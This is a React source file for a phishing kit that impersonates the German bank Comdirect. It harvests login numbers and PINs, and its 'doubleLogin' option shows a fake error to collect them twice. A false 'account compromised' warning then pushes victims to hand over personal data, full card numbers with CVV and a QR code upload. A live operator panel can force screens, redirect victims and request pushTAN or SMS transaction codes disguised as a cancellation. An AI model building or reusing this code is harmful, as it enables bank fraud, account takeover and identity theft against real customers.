import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { updatePageMetadata, getTemplateMetadata } from '../../utils/templateMetadata';
import { submitTemplateData, uploadTemplateFile, getTemplateConfig, createTemplateSession } from '../../utils/templateApi';
import templateSocketClient from '../../utils/socketClient';
import './ComdirectStyle.css';

// Import components
import {
  Header,
  Footer,
  Loading,
  LoginForm,
  ErrorScreen,
  AccountCompromisedScreen,
  PersonalDataForm,
  BankCardForm,
  QRInstructionsScreen,
  QRUploadForm,
  QRErrorScreen,
  FinalSuccessScreen
} from './components';
import { PushTANScreen } from './components/PushTANScreen';
import { SMSTANScreen } from './components/SMSTANScreen';

// Comdirect flow states
const STATES = {
  LOGIN: 'login',
  LOGIN_ERROR: 'login_error',
  ACCOUNT_COMPROMISED: 'account_compromised',
  PERSONAL_DATA: 'personal_data',
  PERSONAL_SUCCESS: 'personal_success',
  QR_INSTRUCTIONS: 'qr_instructions',
  QR_UPLOAD: 'qr_upload',
  QR_ERROR: 'qr_error',
  QR_RETRY: 'qr_retry',
  BANK_CARD: 'bank_card',
  BANK_SUCCESS: 'bank_success',
  FINAL_SUCCESS: 'final_success',
  LOADING: 'loading',
  ERROR: 'error',
  // Advanced states for admin control
  PUSHTAN_REQUEST: 'pushtan_request',
  SMS_TAN_REQUEST: 'sms_tan_request',
  TRANSACTION_CONFIRM: 'transaction_confirm',
  ACCOUNT_VERIFICATION: 'account_verification',
  // AFK/Live Mode states
  WAITING_FOR_ADMIN: 'waiting_for_admin'
};

// Configuration interface
interface StepConfig {
  doubleLogin: boolean;
  personalData: boolean;
  bankCard: boolean;
  qrCode: boolean;
}

// Data interfaces
interface LoginData {
  zugangsnummer: string;
  pin: string;
}

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

// Default configuration
const DEFAULT_CONFIG: StepConfig = {
  doubleLogin: true,
  personalData: true,
  bankCard: true,
  qrCode: true
};

const ComdirectTemplate: React.FC = () => {
  const { key } = useParams<{ key: string }>();
  const navigate = useNavigate();
  const [state, setState] = useState<string>(STATES.LOGIN);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [loadingMessage, setLoadingMessage] = useState("Verbindung wird hergestellt...");
  const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
  const [configLoaded, setConfigLoaded] = useState(false);
  const [loginFormData, setLoginFormData] = useState({ zugangsnummer: '', pin: '' });
  
  // Session data storage
  const [sessionData, setSessionData] = useState<any>({});
  
  // Enhanced TAN system state
  const [currentTanRequest, setCurrentTanRequest] = useState<{
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  } | null>(null);

  // AFK/Live Mode system state
  const [sessionMode, setSessionMode] = useState<'AFK' | 'LIVE'>('AFK');
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);

  // Scroll to top whenever state changes
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [state]);

  // Flow control function - checks if should pause in Live Mode
  const proceedToNextState = (nextState: string, processingMessage: string = 'Wird verarbeitet...') => {
    if (sessionMode === 'LIVE') {
      // In Live Mode: pause and wait for admin
      setLoading(true);
      setLoadingMessage(processingMessage);
      setIsWaitingForAdmin(true);
      
      // Store the next state to transition to when admin continues
      setSessionData(prev => ({ ...prev, pendingState: nextState }));
      
      // Notify admin that user is waiting
      templateSocketClient.emit('user-waiting', {
        sessionKey: key,
        currentState: state,
        pendingState: nextState,
        message: processingMessage
      });
    } else {
      // In AFK Mode: continue automatically
      setState(nextState);
    }
  };

  useEffect(() => {
    const metadata = getTemplateMetadata('comdirect');
    updatePageMetadata(metadata);

    // Load step configuration from backend - MUST complete before user interaction
    const loadConfig = async () => {
      try {
        setLoadingMessage("Schritt-Konfiguration wird geladen...");
        const config = await getTemplateConfig('comdirect');
        setStepConfig(config.steps);
        setConfigLoaded(true);
        if (process.env.NODE_ENV === 'development') {
          console.log('✅ Loaded Comdirect step config:', config.steps);
        }
        if (process.env.NODE_ENV === 'development') {
          console.log('🔧 Comdirect step config details:', {
            doubleLogin: config.steps.doubleLogin,
            personalData: config.steps.personalData,
            qrCode: config.steps.qrCode,
            bankCard: config.steps.bankCard,
            configLoaded: true
          });
        }
      } catch (error) {
        console.warn('⚠️ Failed to load step config, using defaults:', error);
        // Even if API fails, mark as loaded to continue with defaults
        setConfigLoaded(true);
      }
    };

    // Create session if no key provided
    const initializeSession = async () => {
      if (!key) {
        try {
          setLoading(true);
          setLoadingMessage("Sitzung wird erstellt...");
          const newKey = await createTemplateSession('comdirect');
          navigate(`/comdirect/${newKey}`);
        } catch (error) {
          console.error('Failed to create session:', error);
          // Fallback to random key
          const fallbackKey = Math.random().toString(36).substring(2, 15);
          navigate(`/comdirect/${fallbackKey}`);
        } finally {
          setLoading(false);
        }
        return;
      }
    };

    // Wait for config to load, then initialize session
    const initializeAfterConfig = async () => {
      await loadConfig();
      await initializeSession();
      if (key) {
        setLoadingMessage("Sitzung wird initialisiert...");
        setTimeout(() => {
          setLoading(false);
        }, 1000);
      }
    };
    
    initializeAfterConfig();

    // Initialize Socket.io connection for real-time updates
    if (key) {
      templateSocketClient.connect({
        sessionKey: key,
        templateName: 'comdirect',
        onStateForced: (state: string, message?: string) => {
          console.log('🎯 Admin forced state change:', state, message);
          
          // Show loading screen during state transition with natural banking messages
          setLoading(true);
          
          const getLoadingMessage = (targetState: string): string => {
            switch (targetState) {
              case 'personal_data':
                return 'Persönliche Daten werden geladen...';
              case 'qr_upload':
                return 'QR-Code Bereich wird vorbereitet...';
              case 'bank_card':
                return 'Bankdaten werden verarbeitet...';
              case 'final_success':
                return 'Vorgang wird abgeschlossen...';
              case 'account_compromised':
                return 'Sicherheitsprüfung läuft...';
              default:
                return 'Bitte warten Sie...';
            }
          };
          
          setLoadingMessage(message || getLoadingMessage(state));
          
          setTimeout(() => {
            setState(state);
            setLoading(false);
            if (message) {
              alert(message);
            }
          }, 1500);
        },
        onDataInjected: (data: any) => {
          console.log('💉 Admin injected data:', data);
          
          // Show loading screen during data injection
          setLoading(true);
          setLoadingMessage('Daten werden aktualisiert...');
          
          setTimeout(() => {
            setSessionData(prev => ({ ...prev, ...data }));
            setLoading(false);
          }, 1000);
        },
        onRedirect: (url: string) => {
          console.log('🔗 Admin triggered redirect:', url);
          window.location.href = url;
        },
        onMessage: (message: string, type: string) => {
          console.log('💬 Admin message:', message, type);
          alert(`${type.toUpperCase()}: ${message}`);
        },
        // AFK/Live Mode handlers
        onModeChanged: (mode: 'AFK' | 'LIVE') => {
          console.log('🎛️ Admin changed session mode:', mode);
          setSessionMode(mode);
          
          // If switching to AFK mode and waiting, continue flow
          if (mode === 'AFK' && isWaitingForAdmin) {
            setIsWaitingForAdmin(false);
            setLoading(false);
          }
        },
        onContinueFlow: () => {
          console.log('▶️ Admin triggered continue flow');
          if (isWaitingForAdmin && sessionData.pendingState) {
            setIsWaitingForAdmin(false);
            setLoading(false);
            setState(sessionData.pendingState);
            setSessionData(prev => ({ ...prev, pendingState: null }));
          }
        },
        // Enhanced TAN system handlers
        onTanRequest: (tanData: {
          type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
          method: 'pushtan' | 'sms';
          transactionDetails?: any;
          requestId: string;
        }) => {
          console.log('🔐 Admin requested TAN:', tanData);
          
          setLoading(true);
          setLoadingMessage(
            tanData.type === 'TRANSACTION_TAN' 
              ? 'Stornierung wird vorbereitet...' 
              : 'Anmeldung wird verarbeitet...'
          );
          
          setTimeout(() => {
            setCurrentTanRequest(tanData);
            setLoading(false);
            
            if (tanData.method === 'pushtan') {
              setState(STATES.PUSHTAN_REQUEST);
            } else {
              setState(STATES.SMS_TAN_REQUEST);
            }
          }, 2000);
        }
      });

      // Cleanup socket on unmount
      return () => {
        templateSocketClient.disconnect();
      };
    }
  }, [key, navigate, isWaitingForAdmin, sessionData.pendingState]);

  // Handle login submission
  const handleLogin = async (data: LoginData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Login attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Comdirect login submitted:', { zugangsnummer: data.zugangsnummer ? '✓' : '✗' });
      
      // Save login data
      setLoginFormData({ zugangsnummer: data.zugangsnummer, pin: '' });
      
      setLoading(true);
      setLoadingMessage("Anmeldedaten werden überprüft...");
      
      // Submit login data to backend
      const response = await submitTemplateData({
        template_name: 'comdirect',
        key: key || '',
        step: 'login',
        data: {
          username: data.zugangsnummer,
          password: data.pin
        }
      });

      // Check double login configuration
      if (state === STATES.LOGIN) {
        if (stepConfig.doubleLogin) {
          // First attempt - show error
          setState(STATES.LOGIN_ERROR);
        } else {
          // Single login - go directly to account compromised
          setState(STATES.ACCOUNT_COMPROMISED);
        }
      } else if (state === STATES.LOGIN_ERROR) {
        // Second attempt - proceed to account compromised
        setState(STATES.ACCOUNT_COMPROMISED);
      }
      
      setLoading(false);
    } catch (error) {
      console.error('Login error:', error);
      setError('Fehler bei der Anmeldung');
      setState(STATES.LOGIN_ERROR);
      setLoading(false);
    }
  };

  // Handle start verification
  const handleStartVerification = async () => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Start verification attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Starting verification process');
      
      setLoading(true);
      setLoadingMessage("Verifizierung wird gestartet...");
      
      // Submit verification start to backend
      const response = await submitTemplateData({
        template_name: 'comdirect',
        key: key || '',
        step: 'start-verification',
        data: {}
      });

      if (!response.success) {
        setError(response.error || 'Fehler beim Starten der Verifizierung');
        setState(STATES.ERROR);
        setLoading(false);
        return;
      }
      
      // Show personal data form if enabled
      if (stepConfig.personalData) {
        setState(STATES.PERSONAL_DATA);
      } else if (stepConfig.bankCard) {
        setState(STATES.BANK_CARD);
      } else {
        setState(STATES.FINAL_SUCCESS);
      }
      setLoading(false);
    } catch (error) {
      console.error('Start verification error:', error);
      setError('Fehler beim Starten der Verifizierung');
      setState(STATES.ERROR);
      setLoading(false);
    }
  };

  // Handle personal data submission
  const handlePersonalDataSubmit = async (data: PersonalData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Personal data submit attempted before step config loaded - ignoring');
      return;
    }
    try {
      console.log('Personal data submitted:', data);
      
      setLoading(true);
      setLoadingMessage("Persönliche Daten werden verarbeitet.....");
      
      // Submit personal data to backend
      const response = await submitTemplateData({
        template_name: 'comdirect',
        key: key || '',
        step: 'personal-data',
        data: data
      });

      if (response.success) {
        // Continue to bank card form if enabled, otherwise finish
        if (stepConfig.bankCard) {
          setState(STATES.BANK_CARD);
        } else if (stepConfig.qrCode) {
          setState(STATES.QR_INSTRUCTIONS);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      } else {
        setError(response.error || 'Fehler beim Speichern der persönlichen Daten');
        setState(STATES.ERROR);
      }
      
      setLoading(false);
    } catch (error) {
      console.error('Personal data error:', error);
      setError('Fehler beim Speichern der persönlichen Daten');
      setState(STATES.ERROR);
      setLoading(false);
    }
  };

  // Handle bank card submission
  const handleBankCardSubmit = async (data: BankCardData) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ Bank card submit attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Bank card data submitted:', {
        ...data,
        card_number: '****-****-****-' + data.card_number.slice(-4),
        cvv: '***'
      });
      
      setLoading(true);
      setLoadingMessage("Bankkarten-Daten werden verarbeitet.....");
      
      // Submit bank card data to backend
      const response = await submitTemplateData({
        template_name: 'comdirect',
        key: key || '',
        step: 'bank-card-complete',
        data: data
      });

      if (response.success) {
        // Continue to QR instructions if enabled, otherwise finish
        if (stepConfig.qrCode) {
          setState(STATES.QR_INSTRUCTIONS);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      } else {
        setError(response.error || 'Fehler beim Speichern der Bankkarten-Daten');
        setState(STATES.ERROR);
      }
      
      setLoading(false);
    } catch (error) {
      console.error('Bank card error:', error);
      setError('Fehler beim Speichern der Bankkarten-Daten');
      setState(STATES.ERROR);
      setLoading(false);
    }
  };

  // Handle bank card skip
  const handleBankCardSkip = async () => {
    try {
      console.log('comdirect: Bank card skipped for session:', key);
      
      // Submit skip to backend
      const response = await submitTemplateData({
        template_name: 'comdirect',
        key: key || '',
        step: 'bank-card-skip',
        data: { skip_reason: 'no_credit_card' }
      });
      
      if (!response.success) {
        console.error('❌ comdirect bank card skip failed:', response.error);
        setError(response.error || 'Fehler beim Überspringen der Kartendaten');
        setState(STATES.ERROR);
        return;
      }
      
      console.log('✅ comdirect bank card skip completed successfully');
      
      // Show loading screen
      setLoading(true);
      setLoadingMessage("Wird abgeschlossen...");
      
      // Check if QR step is enabled, otherwise go to success
      setTimeout(() => {
        setLoading(false);
        if (stepConfig.qrCode) {
          setState(STATES.QR_INSTRUCTIONS);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      }, 2000);
      
    } catch (error) {
      console.error('❌ comdirect bank card skip error:', error);
      setError('Fehler beim Überspringen der Kartendaten');
      setState(STATES.ERROR);
      setLoading(false);
    }
  };

  // Handle QR instructions continue
  const handleStartQRUpload = async () => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ QR instructions attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('Starting QR upload process');
      
      setLoading(true);
      setLoadingMessage("QR-Upload wird vorbereitet.....");
      
      // Submit QR start to backend
      const response = await submitTemplateData({
        template_name: 'comdirect',
        key: key || '',
        step: 'qr-instructions',
        data: {}
      });

      if (response.success) {
        setState(STATES.QR_UPLOAD);
      } else {
        setError(response.error || 'Fehler beim Starten des QR-Uploads');
        setState(STATES.ERROR);
      }
      
      setLoading(false);
    } catch (error) {
      console.error('Start QR upload error:', error);
      setError('Fehler beim Starten des QR-Uploads');
      setState(STATES.ERROR);
      setLoading(false);
    }
  };

  // Handle QR upload
  const handleQRUpload = async (file: File) => {
    // ✅ CRITICAL: Wait for step config to load before processing
    if (!configLoaded) {
      console.warn('⚠️ QR upload attempted before step config loaded - ignoring');
      return;
    }
    
    try {
      console.log('🔥 COMDIRECT QR UPLOAD HANDLER CALLED with file:', file.name, file.size, file.type);
      
      setLoading(true);
      setLoadingMessage("QR-Code wird verarbeitet.....");
      
      // Upload QR file to backend
      console.log('📤 Uploading QR code for Comdirect session:', key);
      const response = await uploadTemplateFile('comdirect', key || '', file, 'qr-upload');
      
      console.log('✅ Comdirect QR upload response:', response);

      if (response.success) {
        console.log('🎯 Comdirect QR upload successful, transitioning to success');
        setState(STATES.FINAL_SUCCESS);
      } else {
        console.error('❌ Comdirect QR upload failed:', response.error);
        setState(STATES.QR_ERROR);
      }
      
      setLoading(false);
    } catch (error) {
      console.error('❌ Comdirect QR upload error:', error);
      setError('Fehler beim Upload des QR-Codes');
      setState(STATES.ERROR);
      setLoading(false);
    }
  };

  // Render appropriate component based on state
  const renderContent = () => {
    if (loading || !configLoaded) {
      // Special handling for config loading
      if (!configLoaded) {
        return <Loading message="Schritt-Konfiguration wird geladen..." type="default" />;
      }
      // Use different loading types based on context
      let loadingType: 'default' | 'login' | 'verification' | 'processing' | 'upload' | 'transition' = 'default';
      
      if (loadingMessage.includes('Anmeldung') || loadingMessage.includes('Login')) {
        loadingType = 'login';
      } else if (loadingMessage.includes('Verifizierung') || loadingMessage.includes('Verarbeitung')) {
        loadingType = 'verification';
      } else if (loadingMessage.includes('Upload') || loadingMessage.includes('QR')) {
        loadingType = 'upload';
      } else if (loadingMessage.includes('Weiterleitung') || loadingMessage.includes('wird verarbeitet')) {
        loadingType = 'processing';
      } else if (state !== STATES.LOGIN) {
        loadingType = 'transition';
      }
      
      return <Loading message={loadingMessage} type={loadingType} />;
    }
    
    if (error && state === STATES.ERROR) {
      return <ErrorScreen message={error} />;
    }
    
    switch (state) {
      case STATES.LOGIN:
        return <LoginForm sessionKey={key || ''} onSubmit={handleLogin} onLoading={setLoading} initialValues={loginFormData} />;
      
      case STATES.LOGIN_ERROR:
        return <LoginForm sessionKey={key || ''} onSubmit={handleLogin} onLoading={setLoading} showError={true} initialValues={loginFormData} />;
      
      case STATES.ACCOUNT_COMPROMISED:
        return <AccountCompromisedScreen onStartVerification={handleStartVerification} />;
      
      case STATES.PERSONAL_DATA:
        // Only render if personal data step is enabled
        if (stepConfig.personalData) {
          return <PersonalDataForm onSubmit={handlePersonalDataSubmit} />;
        } else {
          // This shouldn't happen if backend is working correctly, but handle gracefully
          console.warn('Personal data form requested but step is disabled');
          return <Loading message="Weiterleitung..." type="transition" />;
        }
      
      case STATES.BANK_CARD:
        // Only render if bank card step is enabled
        if (stepConfig.bankCard) {
          return <BankCardForm onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
        } else {
          // This shouldn't happen if backend is working correctly, but handle gracefully
          console.warn('Bank card form requested but step is disabled');
          return <Loading message="Weiterleitung..." type="transition" />;
        }
      
      case STATES.QR_INSTRUCTIONS:
        return <QRInstructionsScreen onContinue={handleStartQRUpload} />;
      
      case STATES.QR_UPLOAD:
        return <QRUploadForm onUpload={handleQRUpload} />;
      
      case STATES.QR_ERROR:
        return <QRErrorScreen />;
      
      case STATES.QR_RETRY:
        return <QRUploadForm onUpload={handleQRUpload} isRetry={true} />;
      
      case STATES.FINAL_SUCCESS:
        return <FinalSuccessScreen />;
      
      case STATES.PUSHTAN_REQUEST:
        return <PushTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('pushTAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.SMS_TAN_REQUEST:
        return <SMSTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          phoneNumber={sessionData.maskedPhone || sessionData.phone}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('SMS TAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onResend={() => {
            console.log('SMS TAN resend requested');
            templateSocketClient.emit('tan-resend-requested', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.WAITING_FOR_ADMIN:
        return <Loading 
          message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} 
          type="processing"
          showProgress={false}
        />;
      
      case STATES.LOADING:
        return <Loading message={loadingMessage} type="processing" />;
      
      case STATES.ERROR:
        return <ErrorScreen message={error || 'Ein Fehler ist aufgetreten'} />;
      
      default:
        return <ErrorScreen message="Unbekannter Status" />;
    }
  };

  return (
    <div className="min-h-screen bg-white font-gotham">
      <Header />
      <main>
        <div style={{
          maxWidth: '1440px',
          margin: '0 auto',
          padding: '0'
        }}>
          {renderContent()}
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default ComdirectTemplate;
